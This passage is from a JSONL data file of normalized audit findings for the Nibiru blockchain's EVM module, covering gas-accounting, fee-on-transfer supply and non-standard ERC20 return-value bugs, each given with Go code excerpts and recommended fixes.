failed tx gas\n    if strings.Contains(evmResp.VmError, vm.ErrOutOfGas.Error()) {\n        err = fmt.Errorf(\"gas required exceeds allowance (%d)\", gasLimit)\n        return\n    }\n    if evmResp.VmError == vm.ErrExecutionReverted.Error() {\n        err = fmt.Errorf(\"VMError: %w\", evm.NewRevertError(evmResp.Ret))\n        return\n    }\n    err = fmt.Errorf(\"VMError: %s\", evmResp.VmError)\n    return\n}\n```\n\nCompared to the success path at [call_contract.go#L133](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L133):\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    k.ResetGasMeterAndConsumeGas(ctx, ctx.GasMeter().Limit())\n    return nil, nil, errors.Wrap(err, \"error adding transient gas used to block\")\n}\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n\n## Recommended mitigation steps\n\nTo fix this issue, the gas accounting should be consistent between success and failure paths. Add the block gas tracking before handling the failure case:\n\n```go\n// Add to block gas used regardless of success/failure\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    k.ResetGasMeterAndConsumeGas(ctx, ctx.GasMeter().Limit())\n    return nil, nil, errors.Wrap(err, \"error adding transient gas used to block\")\n}\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n\nif evmResp.Failed() {\n    if strings.Contains(evmResp.VmError, vm.ErrOutOfGas.Error()) {\n        err = fmt.Errorf(\"gas required exceeds allowance (%d)\", gasLimit)\n        return\n    }\n    // ... rest of error handling\n}\n```\n\nThis ensures that all gas used, whether from successful or failed transactions, is properly accounted for in the block total.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L118\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nIn `call_contract.go`, when a contract call fails, the code only consumes gas for the failed transaction but does not account for previously accumulated block gas usage. This creates a mismatch between the actual gas used in the block and what gets consumed in the gas meter.\n\nThe issue occurs in the error handling path of `CallContractWithInput` where after a failed call, only the gas of the failed transaction is consumed:\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes gas for this tx\n    // ... error handling\n}\n```\n\nHowever, in the success path, the code correctly adds the gas used to the block total:\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\n// ...\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n\nThis inconsistency means that failed transactions do not properly contribute to the block's gas tracking. This is especially bad when the failed transaction is the last one in a block, as it will decrease the gas counter heavily (only the last transaction vs. the sum of all). \n\n\n## Proof of Concept\n\nThe issue can be found in [call_contract.go#L118](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L118):\n\n```go\nif evmResp.Failed() {\n    k.ResetGasMeterAndConsumeGas(ctx, evmResp.GasUsed) // Only consumes failed tx gas\n    if strings.Contains(evmResp.VmError, vm.ErrOutOfGas.Error()) {\n        err = fmt.Errorf(\"gas required exceeds allowance (%d)\", gasLimit)\n        return\n    }\n    if evmResp.VmError == vm.ErrExecutionReverted.Error() {\n        err = fmt.Errorf(\"VMError: %w\", evm.NewRevertError(evmResp.Ret))\n        return\n    }\n    err = fmt.Errorf(\"VMError: %s\", evmResp.VmError)\n    return\n}\n```\n\nCompared to the success path at [call_contract.go#L133](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/call_contract.go#L133):\n\n```go\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    k.ResetGasMeterAndConsumeGas(ctx, ctx.GasMeter().Limit())\n    return nil, nil, errors.Wrap(err, \"error adding transient gas used to block\")\n}\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n```\n\n## Recommended mitigation steps\n\nTo fix this issue, the gas accounting should be consistent between success and failure paths. Add the block gas tracking before handling the failure case:\n\n```go\n// Add to block gas used regardless of success/failure\nblockGasUsed, err := k.AddToBlockGasUsed(ctx, evmResp.GasUsed)\nif err != nil {\n    k.ResetGasMeterAndConsumeGas(ctx, ctx.GasMeter().Limit())\n    return nil, nil, errors.Wrap(err, \"error adding transient gas used to block\")\n}\nk.ResetGasMeterAndConsumeGas(ctx, blockGasUsed)\n\nif evmResp.Failed() {\n    if strings.Contains(evmResp.VmError, vm.ErrOutOfGas.Error()) {\n        err = fmt.Errorf(\"gas required exceeds allowance (%d)\", gasLimit)\n        return\n    }\n    // ... rest of error handling\n}\n```\n\nThis ensures that all gas used, whether from successful or failed transactions, is properly accounted for in the block total."}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-048", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 48, "page_start": null, "title": "Double fee application breaks supply invariant for fee-on-transfer ERC20s", "short_summary": null, "description_md": "## Finding description and impact\n\nThe EVM module incorrectly handles fee-on-transfer tokens when converting bank coins back to ERC20s, resulting in unbacked bank coins remaining in circulation. This breaks the intended 1:1 supply tracking invariant between ERC20 tokens and their bank coin representations.\n\nWhen converting from ERC20 to bank coins via `sendToBank`, the code correctly accounts for transfer fees by only minting bank coins equal to the amount actually received. However, when converting these bank coins back to ERC20s via `convertCoinToEvmBornERC20`, the code:\n1. Takes in X bank coins from the user\n2. Tries to transfer X ERC20 tokens\n3. Due to fees, only Y tokens are received (Y < X)\n4. Only burns Y bank coins\n\nThis creates a discrepancy since the original conversion already accounted for fees. The transfer fees are effectively applied twice:\n1. First fee: 100 ERC20 -> 95 bank coins (correct)\n2. Second fee: 95 bank coins -> ~90.25 ERC20 (and only burn 90.25 bank coins)\n\nThis leaves 4.75 unbacked bank coins in circulation (95 - 90.25), as the code only burns what was actually transferred in the second conversion.\n\nThe impact is monetary - it creates unbacked bank coins that can be used in the rest of the system but don't have corresponding ERC20 tokens backing them in the EVM module's account. Over time, this could lead to significant supply inflation of the bank coin representation.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/funtoken.go#L162-L170\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe EVM module incorrectly handles fee-on-transfer tokens when converting bank coins back to ERC20s, resulting in unbacked bank coins remaining in circulation. This breaks the intended 1:1 supply tracking invariant between ERC20 tokens and their bank coin representations.\n\nWhen converting from ERC20 to bank coins via `sendToBank`, the code correctly accounts for transfer fees by only minting bank coins equal to the amount actually received. However, when converting these bank coins back to ERC20s via `convertCoinToEvmBornERC20`, the code:\n1. Takes in X bank coins from the user\n2. Tries to transfer X ERC20 tokens\n3. Due to fees, only Y tokens are received (Y < X)\n4. Only burns Y bank coins\n\nThis creates a discrepancy since the original conversion already accounted for fees. The transfer fees are effectively applied twice:\n1. First fee: 100 ERC20 -> 95 bank coins (correct)\n2. Second fee: 95 bank coins -> ~90.25 ERC20 (and only burn 90.25 bank coins)\n\nThis leaves 4.75 unbacked bank coins in circulation (95 - 90.25), as the code only burns what was actually transferred in the second conversion.\n\nThe impact is monetary - it creates unbacked bank coins that can be used in the rest of the system but don't have corresponding ERC20 tokens backing them in the EVM module's account. Over time, this could lead to significant supply inflation of the bank coin representation.\n\n## Proof of Concept\n\nThe first conversion correctly handles fees in `funtoken.go`:\n\n```go\n// First conversion correctly uses actual received amount\ngotAmount, transferResp, err := p.evmKeeper.ERC20().Transfer(erc20, caller, transferTo, amount, ctx)\nif err != nil {\n    return nil, fmt.Errorf(\"error in ERC20.transfer from caller to EVM account: %w\", err)\n}\ncoinToSend := sdk.NewCoin(funtoken.BankDenom, math.NewIntFromBigInt(gotAmount))\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/funtoken.go#L162-L170)\n\nBut when converting back in `msg_server.go`, it incorrectly applies fees again:\n\n```go\nactualSentAmount, _, err := k.ERC20().Transfer(\n    erc20Addr,\n    evm.EVM_MODULE_ADDRESS,\n    recipient,\n    coin.Amount.BigInt(),\n    ctx,\n)\nif err != nil {\n    return nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n}\n\n// Only burns the amount after fees, even though fees were already accounted for\nburnCoin := sdk.NewCoin(coin.Denom, sdk.NewIntFromBigInt(actualSentAmount))\nerr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(burnCoin))\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L597-L613)\n\nThe code explicitly aims to maintain a supply invariant:\n```go\n// to preserve an invariant on the sum of the FunToken's bank and ERC20 supply,\n// we burn the coins here in the BC  ERC20 conversion.\n```\n[Link to comment](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L603)\n\n## Recommended mitigation steps\n\nWhen converting bank coins back to ERC20s in `convertCoinToEvmBornERC20`, the code should burn the full input amount of bank coins, not just the amount after fees. This ensures fees are only applied once in the entire conversion cycle.\n\n```go\n// In msg_server.go convertCoinToEvmBornERC20:\nactualSentAmount, _, err := k.ERC20().Transfer(\n    erc20Addr,\n    evm.EVM_MODULE_ADDRESS,\n    recipient,\n    coin.Amount.BigInt(),\n    ctx,\n)\nif err != nil {\n    return nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n}\n\n// Burn the full input amount, not the amount after fees\nerr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(coin))\n```\n\nThis maintains the supply invariant since:\n1. First conversion: 100 ERC20 -> 95 bank coins (after 5% fee)\n2. Second conversion: 95 bank coins -> ~90.25 ERC20 (after another 5% fee), burn full 95 bank coins\n\nThe documentation should also be updated to explicitly describe how fee-on-transfer tokens are handled and that fees will apply on both conversions.\n", "sections": {"description_md": "## Finding description and impact\n\nThe EVM module incorrectly handles fee-on-transfer tokens when converting bank coins back to ERC20s, resulting in unbacked bank coins remaining in circulation. This breaks the intended 1:1 supply tracking invariant between ERC20 tokens and their bank coin representations.\n\nWhen converting from ERC20 to bank coins via `sendToBank`, the code correctly accounts for transfer fees by only minting bank coins equal to the amount actually received. However, when converting these bank coins back to ERC20s via `convertCoinToEvmBornERC20`, the code:\n1. Takes in X bank coins from the user\n2. Tries to transfer X ERC20 tokens\n3. Due to fees, only Y tokens are received (Y < X)\n4. Only burns Y bank coins\n\nThis creates a discrepancy since the original conversion already accounted for fees. The transfer fees are effectively applied twice:\n1. First fee: 100 ERC20 -> 95 bank coins (correct)\n2. Second fee: 95 bank coins -> ~90.25 ERC20 (and only burn 90.25 bank coins)\n\nThis leaves 4.75 unbacked bank coins in circulation (95 - 90.25), as the code only burns what was actually transferred in the second conversion.\n\nThe impact is monetary - it creates unbacked bank coins that can be used in the rest of the system but don't have corresponding ERC20 tokens backing them in the EVM module's account. Over time, this could lead to significant supply inflation of the bank coin representation.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\nWhen converting bank coins back to ERC20s in `convertCoinToEvmBornERC20`, the code should burn the full input amount of bank coins, not just the amount after fees. This ensures fees are only applied once in the entire conversion cycle.\n\n```go\n// In msg_server.go convertCoinToEvmBornERC20:\nactualSentAmount, _, err := k.ERC20().Transfer(\n    erc20Addr,\n    evm.EVM_MODULE_ADDRESS,\n    recipient,\n    coin.Amount.BigInt(),\n    ctx,\n)\nif err != nil {\n    return nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n}\n\n// Burn the full input amount, not the amount after fees\nerr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(coin))\n```\n\nThis maintains the supply invariant since:\n1. First conversion: 100 ERC20 -> 95 bank coins (after 5% fee)\n2. Second conversion: 95 bank coins -> ~90.25 ERC20 (after another 5% fee), burn full 95 bank coins\n\nThe documentation should also be updated to explicitly describe how fee-on-transfer tokens are handled and that fees will apply on both conversions.\n", "poc_md": "## Proof of Concept\n\nThe first conversion correctly handles fees in `funtoken.go`:\n\n```go\n// First conversion correctly uses actual received amount\ngotAmount, transferResp, err := p.evmKeeper.ERC20().Transfer(erc20, caller, transferTo, amount, ctx)\nif err != nil {\n    return nil, fmt.Errorf(\"error in ERC20.transfer from caller to EVM account: %w\", err)\n}\ncoinToSend := sdk.NewCoin(funtoken.BankDenom, math.NewIntFromBigInt(gotAmount))\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/funtoken.go#L162-L170)\n\nBut when converting back in `msg_server.go`, it incorrectly applies fees again:\n\n```go\nactualSentAmount, _, err := k.ERC20().Transfer(\n    erc20Addr,\n    evm.EVM_MODULE_ADDRESS,\n    recipient,\n    coin.Amount.BigInt(),\n    ctx,\n)\nif err != nil {\n    return nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n}\n\n// Only burns the amount after fees, even though fees were already accounted for\nburnCoin := sdk.NewCoin(coin.Denom, sdk.NewIntFromBigInt(actualSentAmount))\nerr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(burnCoin))\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L597-L613)\n\nThe code explicitly aims to maintain a supply invariant:\n```go\n// to preserve an invariant on the sum of the FunToken's bank and ERC20 supply,\n// we burn the coins here in the BC  ERC20 conversion.\n```\n[Link to comment](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L603)\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/funtoken.go#L162-L170\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/funtoken.go#L162-L170\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe EVM module incorrectly handles fee-on-transfer tokens when converting bank coins back to ERC20s, resulting in unbacked bank coins remaining in circulation. This breaks the intended 1:1 supply tracking invariant between ERC20 tokens and their bank coin representations.\n\nWhen converting from ERC20 to bank coins via `sendToBank`, the code correctly accounts for transfer fees by only minting bank coins equal to the amount actually received. However, when converting these bank coins back to ERC20s via `convertCoinToEvmBornERC20`, the code:\n1. Takes in X bank coins from the user\n2. Tries to transfer X ERC20 tokens\n3. Due to fees, only Y tokens are received (Y < X)\n4. Only burns Y bank coins\n\nThis creates a discrepancy since the original conversion already accounted for fees. The transfer fees are effectively applied twice:\n1. First fee: 100 ERC20 -> 95 bank coins (correct)\n2. Second fee: 95 bank coins -> ~90.25 ERC20 (and only burn 90.25 bank coins)\n\nThis leaves 4.75 unbacked bank coins in circulation (95 - 90.25), as the code only burns what was actually transferred in the second conversion.\n\nThe impact is monetary - it creates unbacked bank coins that can be used in the rest of the system but don't have corresponding ERC20 tokens backing them in the EVM module's account. Over time, this could lead to significant supply inflation of the bank coin representation.\n\n## Proof of Concept\n\nThe first conversion correctly handles fees in `funtoken.go`:\n\n```go\n// First conversion correctly uses actual received amount\ngotAmount, transferResp, err := p.evmKeeper.ERC20().Transfer(erc20, caller, transferTo, amount, ctx)\nif err != nil {\n    return nil, fmt.Errorf(\"error in ERC20.transfer from caller to EVM account: %w\", err)\n}\ncoinToSend := sdk.NewCoin(funtoken.BankDenom, math.NewIntFromBigInt(gotAmount))\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/funtoken.go#L162-L170)\n\nBut when converting back in `msg_server.go`, it incorrectly applies fees again:\n\n```go\nactualSentAmount, _, err := k.ERC20().Transfer(\n    erc20Addr,\n    evm.EVM_MODULE_ADDRESS,\n    recipient,\n    coin.Amount.BigInt(),\n    ctx,\n)\nif err != nil {\n    return nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n}\n\n// Only burns the amount after fees, even though fees were already accounted for\nburnCoin := sdk.NewCoin(coin.Denom, sdk.NewIntFromBigInt(actualSentAmount))\nerr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(burnCoin))\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L597-L613)\n\nThe code explicitly aims to maintain a supply invariant:\n```go\n// to preserve an invariant on the sum of the FunToken's bank and ERC20 supply,\n// we burn the coins here in the BC  ERC20 conversion.\n```\n[Link to comment](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L603)\n\n## Recommended mitigation steps\n\nWhen converting bank coins back to ERC20s in `convertCoinToEvmBornERC20`, the code should burn the full input amount of bank coins, not just the amount after fees. This ensures fees are only applied once in the entire conversion cycle.\n\n```go\n// In msg_server.go convertCoinToEvmBornERC20:\nactualSentAmount, _, err := k.ERC20().Transfer(\n    erc20Addr,\n    evm.EVM_MODULE_ADDRESS,\n    recipient,\n    coin.Amount.BigInt(),\n    ctx,\n)\nif err != nil {\n    return nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n}\n\n// Burn the full input amount, not the amount after fees\nerr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(coin))\n```\n\nThis maintains the supply invariant since:\n1. First conversion: 100 ERC20 -> 95 bank coins (after 5% fee)\n2. Second conversion: 95 bank coins -> ~90.25 ERC20 (after another 5% fee), burn full 95 bank coins\n\nThe documentation should also be updated to explicitly describe how fee-on-transfer tokens are handled and that fees will apply on both conversions.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/funtoken.go#L162-L170\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe EVM module incorrectly handles fee-on-transfer tokens when converting bank coins back to ERC20s, resulting in unbacked bank coins remaining in circulation. This breaks the intended 1:1 supply tracking invariant between ERC20 tokens and their bank coin representations.\n\nWhen converting from ERC20 to bank coins via `sendToBank`, the code correctly accounts for transfer fees by only minting bank coins equal to the amount actually received. However, when converting these bank coins back to ERC20s via `convertCoinToEvmBornERC20`, the code:\n1. Takes in X bank coins from the user\n2. Tries to transfer X ERC20 tokens\n3. Due to fees, only Y tokens are received (Y < X)\n4. Only burns Y bank coins\n\nThis creates a discrepancy since the original conversion already accounted for fees. The transfer fees are effectively applied twice:\n1. First fee: 100 ERC20 -> 95 bank coins (correct)\n2. Second fee: 95 bank coins -> ~90.25 ERC20 (and only burn 90.25 bank coins)\n   \nThis leaves 4.75 unbacked bank coins in circulation (95 - 90.25), as the code only burns what was actually transferred in the second conversion.\n\nThe impact is monetary - it creates unbacked bank coins that can be used in the rest of the system but don't have corresponding ERC20 tokens backing them in the EVM module's account. Over time, this could lead to significant supply inflation of the bank coin representation.\n\n## Proof of Concept\n\nThe first conversion correctly handles fees in `funtoken.go`:\n\n```go\n// First conversion correctly uses actual received amount\ngotAmount, transferResp, err := p.evmKeeper.ERC20().Transfer(erc20, caller, transferTo, amount, ctx)\nif err != nil {\n    return nil, fmt.Errorf(\"error in ERC20.transfer from caller to EVM account: %w\", err)\n}\ncoinToSend := sdk.NewCoin(funtoken.BankDenom, math.NewIntFromBigInt(gotAmount))\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/funtoken.go#L162-L170)\n\nBut when converting back in `msg_server.go`, it incorrectly applies fees again:\n\n```go\nactualSentAmount, _, err := k.ERC20().Transfer(\n    erc20Addr,\n    evm.EVM_MODULE_ADDRESS,\n    recipient,\n    coin.Amount.BigInt(),\n    ctx,\n)\nif err != nil {\n    return nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n}\n\n// Only burns the amount after fees, even though fees were already accounted for\nburnCoin := sdk.NewCoin(coin.Denom, sdk.NewIntFromBigInt(actualSentAmount))\nerr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(burnCoin))\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L597-L613)\n\nThe code explicitly aims to maintain a supply invariant:\n```go\n// to preserve an invariant on the sum of the FunToken's bank and ERC20 supply, \n// we burn the coins here in the BC  ERC20 conversion.\n```\n[Link to comment](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/msg_server.go#L603)\n\n## Recommended mitigation steps\n\nWhen converting bank coins back to ERC20s in `convertCoinToEvmBornERC20`, the code should burn the full input amount of bank coins, not just the amount after fees. This ensures fees are only applied once in the entire conversion cycle.\n\n```go\n// In msg_server.go convertCoinToEvmBornERC20:\nactualSentAmount, _, err := k.ERC20().Transfer(\n    erc20Addr,\n    evm.EVM_MODULE_ADDRESS,\n    recipient,\n    coin.Amount.BigInt(),\n    ctx,\n)\nif err != nil {\n    return nil, errors.Wrap(err, \"failed to transfer ERC-20 tokens\")\n}\n\n// Burn the full input amount, not the amount after fees\nerr = k.Bank.BurnCoins(ctx, evm.ModuleName, sdk.NewCoins(coin))\n```\n\nThis maintains the supply invariant since:\n1. First conversion: 100 ERC20 -> 95 bank coins (after 5% fee)\n2. Second conversion: 95 bank coins -> ~90.25 ERC20 (after another 5% fee), burn full 95 bank coins\n\nThe documentation should also be updated to explicitly describe how fee-on-transfer tokens are handled and that fees will apply on both conversions."}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-054", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 54, "page_start": null, "title": "ERC20 Transfer Fails With Non-Compliant Tokens Missing Return Values", "short_summary": null, "description_md": "## Finding description and impact\n\nThe `erc20.go` file assumes all ERC20 tokens return a boolean value from transfer operations, but some popular tokens like USDT, BNB, and OMG do not (https://github.com/d-xo/weird-erc20). These tokens are valid ERC20s but do not conform to the current standard of returning a boolean.\n\nWhen attempting to transfer such tokens, `UnpackIntoInterface` will call `Unpack` which fails when there is no return data but a return value is expected in the ABI. This causes the transfer to fail with an error, preventing users from transferring otherwise valid tokens through the system.\n\nAs noted in the contest scope, handling of \"Missing return values\" is explicitly in scope for this audit.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/erc20.go#L91\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe `erc20.go` file assumes all ERC20 tokens return a boolean value from transfer operations, but some popular tokens like USDT, BNB, and OMG do not (https://github.com/d-xo/weird-erc20). These tokens are valid ERC20s but do not conform to the current standard of returning a boolean.\n\nWhen attempting to transfer such tokens, `UnpackIntoInterface` will call `Unpack` which fails when there is no return data but a return value is expected in the ABI. This causes the transfer to fail with an error, preventing users from transferring otherwise valid tokens through the system.\n\nAs noted in the contest scope, handling of \"Missing return values\" is explicitly in scope for this audit.\n\n## Proof of Concept\n\nThe issue occurs in [erc20.go:91-95](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/erc20.go#L91):\n\n```go\nvar erc20Bool ERC20Bool\nerr = e.ABI.UnpackIntoInterface(&erc20Bool, \"transfer\", resp.Ret)\nif err != nil {\n    return balanceIncrease, nil, err\n}\n```\n\nThe underlying `Unpack` function in the Ethereum ABI encoding will error when attempting to unpack empty return data if the ABI specifies a return value (`go-ethereum/accounts/abi/argument.go`):\n\n```go\nfunc (arguments Arguments) Unpack(data []byte) ([]interface{}, error) {\n    if len(data) == 0 {\n        if len(arguments.NonIndexed()) != 0 {\n            return nil, errors.New(\"abi: attempting to unmarshall an empty string while arguments are expected\")\n        }\n        return make([]interface{}, 0), nil\n    }\n    return arguments.UnpackValues(data)\n}\n```\n\nThis prevents transfers of tokens like USDT that don't return a value, even when the transfer itself succeeds.\n\n## Recommended mitigation steps\n\nModify the transfer function to consider a transfer successful if:\n1. The token returns true OR\n2. The token returns no value and the transfer didn't revert\n\n```go\nfunc (e erc20Calls) Transfer(\n    contract, from, to gethcommon.Address, amount *big.Int,\n    ctx sdk.Context,\n) (balanceIncrease *big.Int, resp *evm.MsgEthereumTxResponse, err error) {\n    recipientBalanceBefore, err := e.BalanceOf(contract, to, ctx)\n    if err != nil {\n        return balanceIncrease, nil, errors.Wrap(err, \"failed to retrieve recipient balance\")\n    }\n\n    resp, err = e.CallContract(ctx, e.ABI, from, &contract, true, Erc20GasLimitExecute, \"transfer\", to, amount)\n    if err != nil {\n        return balanceIncrease, nil, err\n    }\n\n    // If there's return data, try to unpack it\n    if len(resp.Ret) > 0 {\n        var erc20Bool ERC20Bool\n        if err := e.ABI.UnpackIntoInterface(&erc20Bool, \"transfer\", resp.Ret); err != nil {\n            return balanceIncrease, nil, err\n        }\n        if !erc20Bool.Value {\n            return balanceIncrease, nil, fmt.Errorf(\"transfer executed but returned success=false\")\n        }\n    }\n    // No return data = transfer didn't revert, consider it successful\n\n    recipientBalanceAfter, err := e.BalanceOf(contract, to, ctx)\n    if err != nil {\n        return balanceIncrease, nil, errors.Wrap(err, \"failed to retrieve recipient balance\")\n    }\n\n    balanceIncrease = new(big.Int).Sub(recipientBalanceAfter, recipientBalanceBefore)\n    if balanceIncrease.Sign() <= 0 {\n        return balanceIncrease, nil, fmt.Errorf(\n            \"amount of ERC20 tokens received MUST be positive: the balance of recipient %s would've changed by %v for token %s\",\n            to.Hex(), balanceIncrease.String(), contract.Hex(),\n        )\n    }\n\n    return balanceIncrease, resp, nil\n}\n```\n\nThis makes the system compatible with both standard ERC20 tokens that return a boolean and non-standard tokens that don't return a value. The approach is similar to that used by established DeFi protocols that need to handle both types of tokens.\n", "sections": {"description_md": "## Finding description and impact\n\nThe `erc20.go` file assumes all ERC20 tokens return a boolean value from transfer operations, but some popular tokens like USDT, BNB, and OMG do not (https://github.com/d-xo/weird-erc20). These tokens are valid ERC20s but do not conform to the current standard of returning a boolean.\n\nWhen attempting to transfer such tokens, `UnpackIntoInterface` will call `Unpack` which fails when there is no return data but a return value is expected in the ABI. This causes the transfer to fail with an error, preventing users from transferring otherwise valid tokens through the system.\n\nAs noted in the contest scope, handling of \"Missing return values\" is explicitly in scope for this audit.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\nModify the transfer function to consider a transfer successful if:\n1. The token returns true OR\n2. The token returns no value and the transfer didn't revert\n\n```go\nfunc (e erc20Calls) Transfer(\n    contract, from, to gethcommon.Address, amount *big.Int,\n    ctx sdk.Context,\n) (balanceIncrease *big.Int, resp *evm.MsgEthereumTxResponse, err error) {\n    recipientBalanceBefore, err := e.BalanceOf(contract, to, ctx)\n    if err != nil {\n        return balanceIncrease, nil, errors.Wrap(err, \"failed to retrieve recipient balance\")\n    }\n\n    resp, err = e.CallContract(ctx, e.ABI, from, &contract, true, Erc20GasLimitExecute, \"transfer\", to, amount)\n    if err != nil {\n        return balanceIncrease, nil, err\n    }\n\n    // If there's return data, try to unpack it\n    if len(resp.Ret) > 0 {\n        var erc20Bool ERC20Bool\n        if err := 